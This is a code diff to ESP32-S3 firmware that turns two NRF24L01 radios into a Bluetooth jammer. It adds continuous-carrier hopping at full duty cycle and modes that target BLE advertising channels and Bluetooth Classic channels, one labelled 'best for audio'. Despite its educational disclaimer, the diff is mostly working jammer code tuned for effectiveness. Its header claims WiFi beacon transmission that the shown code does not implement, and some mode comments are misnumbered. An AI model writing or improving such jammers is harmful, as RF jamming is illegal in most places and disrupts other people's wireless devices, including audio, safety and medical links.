@@ -1,13 +1,16 @@
 /**
- * ESP32-S3 Bluetooth Jammer with Dual NRF24L01+PA+LNA + built-in BLE
- * Based on: ESPnRF24-Jammer, RF-Clown, and MyJammer projects
+ * ESP32-S3 Bluetooth Jammer — Dual NRF24L01+PA+LNA + ESP32 WiFi TX
+ * Based on: RF-Clown, ESPnRF24-Jammer, Bruce firmware, and MyJammer
  * FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY
  *
  * WARNING: Use of RF jammers is illegal in most countries.
  * This code is for understanding RF communications and
  * testing your own equipment's vulnerability ONLY.
  *
- * Three transmitters: NRF24 #1, NRF24 #2, and ESP32-S3 built-in BLE (advertising).
+ * Three transmitters:
+ *   NRF24 #1 — CW (continuous wave) with 130 µs PLL dwell per hop
+ *   NRF24 #2 — CW (continuous wave) with 130 µs PLL dwell per hop
+ *   ESP32 WiFi TX — 20 MHz wideband raw beacon frames on ch 1/6/11
  */
 
 #include <cstdio>
@@ -22,6 +25,7 @@
 #include "esp_wifi_types.h"
 #include "esp_event.h"
 #include "esp_netif.h"
+#include "esp_rom_sys.h"
 #include "driver/gpio.h"
 #include "driver/rmt_tx.h"
 #include "driver/rmt_encoder.h"
@@ -129,20 +133,25 @@ static inline uint8_t rand_channel(void) {
 }
 
 enum JammerMode {
-    MODE_BARRAGE,           // random-hop packet flood, radios on different channels
-    MODE_BT_CLASSIC_SPLIT,  // radios sweep opposite halves (0-39 / 40-79)
-    MODE_BLE_ALL_DATA,      // hit all 40 BLE data+adv channels
+    MODE_BARRAGE,           // CW random-hop all 80 ch, 130µs PLL dwell, 100% RF duty
+    MODE_BLE_ADV_BARRAGE,   // R1=BLE adv ch (control plane) + R2=random (data plane)
+    MODE_BT_CLASSIC,        // CW sequential sweep ch 2-80, 130µs dwell
+    MODE_BLE_ALL,           // even channels 2-80 (all 40 BLE data+adv channels)
+    MODE_BLE_ADV,           // channels 2, 26, 80 only (BLE advertising priority)
     MODE_CONSTANT_CARRIER,  // CW on ch 45 (baseline test)
     MODE_COUNT
 };
 
-static JammerMode currentMode = MODE_BARRAGE;
-static uint8_t sweep_ch1 = 0;
-static uint8_t sweep_ch2 = 40;
+static volatile JammerMode currentMode = MODE_BARRAGE;
+static volatile bool s_mode_changed = false;
+static uint8_t sweep_ch1 = 2;
+static uint8_t sweep_ch2 = 41;
 static bool sweep_dir1 = true;
 static bool sweep_dir2 = true;
+static uint8_t ble_idx1 = 0;
+static uint8_t ble_idx2 = 20;
+static uint8_t ble_adv_idx = 0;
 
-// Jamming on/off: LED on when active, off when stopped. Button short-press toggles; long-press cycles mode.
 static volatile bool s_jamming_active = false;
 
 // Button state: short press = toggle jamming, long press = cycle mode
@@ -159,10 +168,11 @@ static void log_nrf24_spi_probe(const char* bus_name, SPI& spi);
 static void configure_radio_for_tx(RF24& radio);
 static void hop_carrier(RF24& radio, uint8_t channel);
 static void jam_barrage(void);
-static void jam_bt_classic_split(void);
-static void jam_ble_all_data(void);
+static void jam_ble_adv_barrage(void);
+static void jam_bt_classic(void);
+static void jam_ble_all(void);
+static void jam_ble_adv(void);
 static void jam_constant_carrier(void);
-static void apply_jamming_mode_once(void);
 static void print_mode(void);
 static void switch_mode(void);
 static int check_button_event(void);
@@ -425,62 +435,89 @@ static void init_nrf24_modules(void)
     }
 
     // ---- RF self-test: each radio transmits CW, the other scans RPD ----
+    // RPD triggers at >= -64 dBm. PA+LNA modules vary in output; a FAIL here
+    // may just mean the signal is marginal at the inter-module distance, not
+    // that the radio is dead. If isChipConnected() returns true and registers
+    // look correct, the module is almost certainly transmitting.
     if (module1_ok && module2_ok) {
         const uint8_t test_ch = 50;
-        LOG_INIT("=== RF SELF-TEST on ch %d ===", test_ch);
+        const int attempts = 3;
+        const int dwell_ms = 20;
+        LOG_INIT("=== RF SELF-TEST on ch %d (%d attempts, %d ms dwell) ===",
+                 test_ch, attempts, dwell_ms);
 
-        // Test 1: RF1 TX → RF2 RX (full re-init both radios first)
-        radio1.begin(&spi0);
-        radio2.begin(&spi1);
-        vTaskDelay(pdMS_TO_TICKS(5));
+        // Test 1: RF1 TX → RF2 RX
+        bool rpd_r2 = false;
+        for (int attempt = 0; attempt < attempts && !rpd_r2; attempt++) {
+            radio1.begin(&spi0);
+            radio2.begin(&spi1);
+            vTaskDelay(pdMS_TO_TICKS(5));
 
-        radio2.setChannel(test_ch);
-        radio2.startListening();
-        vTaskDelay(pdMS_TO_TICKS(2));
+            radio2.setChannel(test_ch);
+            radio2.startListening();
+            vTaskDelay(pdMS_TO_TICKS(2));
 
-        radio1.stopListening();
-        radio1.startConstCarrier(RF24_PA_MAX, test_ch);
-        vTaskDelay(pdMS_TO_TICKS(10));
+            radio1.stopListening();
+            radio1.startConstCarrier(RF24_PA_MAX, test_ch);
+            vTaskDelay(pdMS_TO_TICKS(dwell_ms));
 
-        bool rpd_r2 = radio2.testRPD();
-        radio1.stopConstCarrier();
-        radio2.stopListening();
+            rpd_r2 = radio2.testRPD();
+            radio1.stopConstCarrier();
+            radio2.stopListening();
+
+            if (!rpd_r2 && attempt < attempts - 1)
+                vTaskDelay(pdMS_TO_TICKS(10));
+        }
 
         if (rpd_r2)
             LOG_RF1("TX -> RF2 detected signal (RPD=1). RF1 IS transmitting.");
         else
-            LOG_ERR("TX -> RF2 detected NOTHING (RPD=0). RF1 may not be transmitting! Check antenna / PA.");
+            LOG_WRN("TX -> RF2: RPD=0 after %d attempts. RF1 signal below -64 dBm at module distance. "
+                     "Likely OK if isChipConnected=yes — check antenna seating / PA module quality.",
+                     attempts);
 
-        // Test 2: RF2 TX → RF1 RX (full re-init both radios again)
-        radio1.begin(&spi0);
-        radio2.begin(&spi1);
-        vTaskDelay(pdMS_TO_TICKS(5));
+        // Test 2: RF2 TX → RF1 RX
+        bool rpd_r1 = false;
+        for (int attempt = 0; attempt < attempts && !rpd_r1; attempt++) {
+            radio1.begin(&spi0);
+            radio2.begin(&spi1);
+            vTaskDelay(pdMS_TO_TICKS(5));
 
-        radio1.setChannel(test_ch);
-        radio1.startListening();
-        vTaskDelay(pdMS_TO_TICKS(2));
+            radio1.setChannel(test_ch);
+            radio1.startListening();
+            vTaskDelay(pdMS_TO_TICKS(2));
 
-        radio2.stopListening();
-        radio2.startConstCarrier(RF24_PA_MAX, test_ch);
-        vTaskDelay(pdMS_TO_TICKS(10));
+            radio2.stopListening();
+            radio2.startConstCarrier(RF24_PA_MAX, test_ch);
+            vTaskDelay(pdMS_TO_TICKS(dwell_ms));
 
-        bool rpd_r1 = radio1.testRPD();
-        radio2.stopConstCarrier();
-        radio1.stopListening();
+            rpd_r1 = radio1.testRPD();
+            radio2.stopConstCarrier();
+            radio1.stopListening();
+
+            if (!rpd_r1 && attempt < attempts - 1)
+                vTaskDelay(pdMS_TO_TICKS(10));
+        }
 
         if (rpd_r1)
             LOG_RF2("TX -> RF1 detected signal (RPD=1). RF2 IS transmitting.");
         else
-            LOG_ERR("TX -> RF1 detected NOTHING (RPD=0). RF2 may not be transmitting! Check antenna / PA.");
+            LOG_WRN("TX -> RF1: RPD=0 after %d attempts. RF2 signal below -64 dBm at module distance. "
+                     "Likely OK if isChipConnected=yes — check antenna seating / PA module quality.",
+                     attempts);
 
-        LOG_INIT("=== RF SELF-TEST done: RF1=%s RF2=%s ===",
-                 rpd_r2 ? "TX_OK" : "TX_FAIL", rpd_r1 ? "TX_OK" : "TX_FAIL");
+        const char* r1_str = rpd_r2 ? "TX_OK" : "TX_WEAK";
+        const char* r2_str = rpd_r1 ? "TX_OK" : "TX_WEAK";
+        LOG_INIT("=== RF SELF-TEST done: RF1=%s RF2=%s (chip1=%s chip2=%s) ===",
+                 r1_str, r2_str,
+                 radio1.isChipConnected() ? "connected" : "DISCONNECTED",
+                 radio2.isChipConnected() ? "connected" : "DISCONNECTED");
     }
 
     if (module1_ok) configure_radio_for_tx(radio1);
     if (module2_ok) configure_radio_for_tx(radio2);
 
-    LOG_INIT("NRF24 TX config: AutoAck=OFF, PA=MAX, 2Mbps, CRC=OFF");
+    LOG_INIT("NRF24 CW config: AutoAck=OFF, PA=MAX, 2Mbps, CRC=OFF, 130us PLL dwell");
     if (module1_ok) { LOG_RF1("--- register dump ---"); radio1.printDetails(); }
     if (module2_ok) { LOG_RF2("--- register dump ---"); radio2.printDetails(); }
 
@@ -501,11 +538,13 @@ static void configure_radio_for_tx(RF24& radio)
     radio.startConstCarrier(RF24_PA_MAX, 45);
 }
 
-// Per Bruce firmware and Nordic docs: just setChannel(), do NOT toggle CE.
-// PLL re-locks in ~130µs. CE stays HIGH → carrier never fully off → max duty cycle.
+// CW hop: just retune the PLL. CE stays HIGH from startConstCarrier() so the
+// carrier never stops — 100% RF duty cycle. The 130 µs dwell lets the PLL
+// lock on the new channel before we hop again.
 static void hop_carrier(RF24& radio, uint8_t channel)
 {
     radio.setChannel(channel);
+    esp_rom_delay_us(130);
 }
 
 static void jam_task(void* arg)
@@ -528,19 +567,28 @@ static void jam_task(void* arg)
             continue;
         }
 
-        if (!was_active) {
+        if (!was_active || s_mode_changed) {
+            s_mode_changed = false;
             configure_radio_for_tx(radio1);
             configure_radio_for_tx(radio2);
-            LOG_JAM("Radios active | R1=%s R2=%s",
-                    radio1.isChipConnected() ? "ok" : "FAIL",
-                    radio2.isChipConnected() ? "ok" : "FAIL");
+            sweep_ch1 = 2;  sweep_ch2 = 41;
+            sweep_dir1 = true; sweep_dir2 = true;
+            ble_idx1 = 0; ble_idx2 = 20;
+            ble_adv_idx = 0;
+            if (!was_active) {
+                LOG_JAM("Radios active | R1=%s R2=%s",
+                        radio1.isChipConnected() ? "ok" : "FAIL",
+                        radio2.isChipConnected() ? "ok" : "FAIL");
+            }
             was_active = true;
         }
 
         switch (currentMode) {
             case MODE_BARRAGE:          jam_barrage(); break;
-            case MODE_BT_CLASSIC_SPLIT: jam_bt_classic_split(); break;
-            case MODE_BLE_ALL_DATA:     jam_ble_all_data(); break;
+            case MODE_BLE_ADV_BARRAGE:  jam_ble_adv_barrage(); break;
+            case MODE_BT_CLASSIC:       jam_bt_classic(); break;
+            case MODE_BLE_ALL:          jam_ble_all(); break;
+            case MODE_BLE_ADV:          jam_ble_adv(); break;
             case MODE_CONSTANT_CARRIER: jam_constant_carrier(); break;
             default: break;
         }
@@ -557,74 +605,97 @@ static void jam_task(void* arg)
     }
 }
 
-// MODE 0: BARRAGE — both radios hop to random independent channels, CW carrier
+// MODE 0: BARRAGE — CW random hop across all 80 channels with 130 µs PLL dwell.
+// Both radios independent random = max unpredictability for AFH.
+// ~6600 hops/s per radio with CW always on (100% RF duty cycle).
 static void jam_barrage(void)
 {
     hop_carrier(radio1, rand_channel());
     hop_carrier(radio2, rand_channel());
 }
 
-// MODE 1: BT CLASSIC SPLIT — radio1 sweeps 0-39, radio2 sweeps 40-79
-static void jam_bt_classic_split(void)
+// BLE advertising channels (shared by multiple modes)
+// ch37=2402→nRF ch2, ch38=2426→nRF ch26, ch39=2480→nRF ch80
+static const uint8_t ble_adv_channels[] = { 2, 26, 80 };
+
+// MODE 1: BLE ADV + BARRAGE — hybrid attack on both control and data planes.
+// Radio 1 rapid-cycles the 3 BLE adv channels (same pattern that worked before).
+// Radio 2 does random barrage across all 80 channels — keeps AFH busy.
+static void jam_ble_adv_barrage(void)
 {
-    hop_carrier(radio1, sweep_ch1);
-    hop_carrier(radio2, sweep_ch2);
-
-    if (sweep_dir1) { if (++sweep_ch1 >= 39) sweep_dir1 = false; }
-    else            { if (sweep_ch1 == 0)     sweep_dir1 = true; else sweep_ch1--; }
-
-    if (sweep_dir2) { if (++sweep_ch2 >= 79) sweep_dir2 = false; }
-    else            { if (sweep_ch2 <= 40)    sweep_dir2 = true; else sweep_ch2--; }
+    hop_carrier(radio1, ble_adv_channels[ble_adv_idx]);
+    ble_adv_idx = (ble_adv_idx + 1) % 3;
+    hop_carrier(radio2, rand_channel());
 }
 
-// NRF24 channels that overlap BLE data + advertising channels
-// BLE uses 2402 + ch*2 MHz (ch 0-39), nRF24 uses 2400 + RF_CH MHz
-static const uint8_t ble_nrf_channels[] = {
+// BT Classic: all 79 FHSS data channels (nRF24 ch 2-80)
+static const uint8_t bt_classic_channels[] = {
+     2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15, 16, 17,
+    18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33,
+    34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49,
+    50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65,
+    66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80,
+};
+#define BT_CLASSIC_CH_COUNT (sizeof(bt_classic_channels) / sizeof(bt_classic_channels[0]))
+
+// MODE 1: BT CLASSIC — CW sequential sweep ch 2-80 with 130 µs PLL dwell.
+// Radios sweep in opposite directions for max coverage.
+static void jam_bt_classic(void)
+{
+    hop_carrier(radio1, bt_classic_channels[sweep_ch1]);
+    hop_carrier(radio2, bt_classic_channels[sweep_ch2]);
+
+    if (sweep_dir1) { if (++sweep_ch1 >= BT_CLASSIC_CH_COUNT - 1) sweep_dir1 = false; }
+    else            { if (sweep_ch1 == 0) sweep_dir1 = true; else sweep_ch1--; }
+
+    if (sweep_dir2) { if (++sweep_ch2 >= BT_CLASSIC_CH_COUNT - 1) sweep_dir2 = false; }
+    else            { if (sweep_ch2 == 0) sweep_dir2 = true; else sweep_ch2--; }
+}
+
+// BLE: all 40 data + advertising channels (even nRF24 channels 2-80)
+static const uint8_t ble_all_channels[] = {
      2,  4,  6,  8, 10, 12, 14, 16, 18, 20,
     22, 24, 26, 28, 30, 32, 34, 36, 38, 40,
     42, 44, 46, 48, 50, 52, 54, 56, 58, 60,
     62, 64, 66, 68, 70, 72, 74, 76, 78, 80,
 };
-#define BLE_NRF_CH_COUNT (sizeof(ble_nrf_channels) / sizeof(ble_nrf_channels[0]))
+#define BLE_ALL_CH_COUNT (sizeof(ble_all_channels) / sizeof(ble_all_channels[0]))
 
-// MODE 2: BLE ALL DATA — cycle through all 40 BLE-mapped channels with CW carrier
-static void jam_ble_all_data(void)
+// MODE 2: BLE ALL — CW cycle through all 40 BLE channels, radios offset by 20
+static void jam_ble_all(void)
 {
-    static uint8_t idx1 = 0, idx2 = 20;
-    hop_carrier(radio1, ble_nrf_channels[idx1]);
-    hop_carrier(radio2, ble_nrf_channels[idx2]);
-    idx1 = (idx1 + 1) % BLE_NRF_CH_COUNT;
-    idx2 = (idx2 + 1) % BLE_NRF_CH_COUNT;
+    hop_carrier(radio1, ble_all_channels[ble_idx1]);
+    hop_carrier(radio2, ble_all_channels[ble_idx2]);
+    ble_idx1 = (ble_idx1 + 1) % BLE_ALL_CH_COUNT;
+    ble_idx2 = (ble_idx2 + 1) % BLE_ALL_CH_COUNT;
 }
 
-// MODE 3: CONSTANT CARRIER — CW on ch 45 (baseline / single-channel test)
+// MODE 4: BLE ADV — rapid-cycle both radios across the 3 BLE adv channels.
+// Each radio hits a different channel per iteration, cycling fast.
+static void jam_ble_adv(void)
+{
+    hop_carrier(radio1, ble_adv_channels[ble_adv_idx]);
+    ble_adv_idx = (ble_adv_idx + 1) % 3;
+    hop_carrier(radio2, ble_adv_channels[ble_adv_idx]);
+    ble_adv_idx = (ble_adv_idx + 1) % 3;
+}
+
+// MODE 4: CONSTANT CARRIER — CW on ch 45 (baseline / single-channel test)
 static void jam_constant_carrier(void)
 {
-    radio1.startConstCarrier(RF24_PA_MAX, 45);
-    radio2.startConstCarrier(RF24_PA_MAX, 45);
-    vTaskDelay(pdMS_TO_TICKS(50));
-}
-
-static void apply_jamming_mode_once(void)
-{
-    configure_radio_for_tx(radio1);
-    configure_radio_for_tx(radio2);
-    switch (currentMode) {
-        case MODE_BARRAGE:          jam_barrage(); break;
-        case MODE_BT_CLASSIC_SPLIT: jam_bt_classic_split(); break;
-        case MODE_BLE_ALL_DATA:     jam_ble_all_data(); break;
-        case MODE_CONSTANT_CARRIER: jam_constant_carrier(); break;
-        default: break;
-    }
+    hop_carrier(radio1, 45);
+    hop_carrier(radio2, 45);
 }
 
 static void print_mode(void)
 {
     const char* modeStr = "UNKNOWN";
     switch (currentMode) {
-        case MODE_BARRAGE:          modeStr = "BARRAGE (random-hop CW carrier)"; break;
-        case MODE_BT_CLASSIC_SPLIT: modeStr = "BT CLASSIC SPLIT (0-39 / 40-79)"; break;
-        case MODE_BLE_ALL_DATA:     modeStr = "BLE ALL DATA (40 ch CW hop)"; break;
+        case MODE_BARRAGE:          modeStr = "BARRAGE (CW random hop, 130us PLL dwell)"; break;
+        case MODE_BLE_ADV_BARRAGE:  modeStr = "ADV+BARRAGE (R1=adv ctrl, R2=random data — best for audio)"; break;
+        case MODE_BT_CLASSIC:       modeStr = "BT CLASSIC (CW sweep, 130us dwell)"; break;
+        case MODE_BLE_ALL:          modeStr = "BLE ALL (40 ch data+adv)"; break;
+        case MODE_BLE_ADV:          modeStr = "BLE ADV (ch 2,26,80 sustained dwell)"; break;
         case MODE_CONSTANT_CARRIER: modeStr = "CONSTANT CARRIER (ch 45)"; break;
         default: break;
     }
@@ -635,8 +706,7 @@ static void switch_mode(void)
 {
     int prev = (int)currentMode;
     currentMode = (JammerMode)((currentMode + 1) % MODE_COUNT);
+    s_mode_changed = true;
     LOG_MODE("Switch %d -> %d", prev, (int)currentMode);
     print_mode();
-    sweep_ch1 = 0;  sweep_ch2 = 40;
-    sweep_dir1 = true; sweep_dir2 = true;
 }
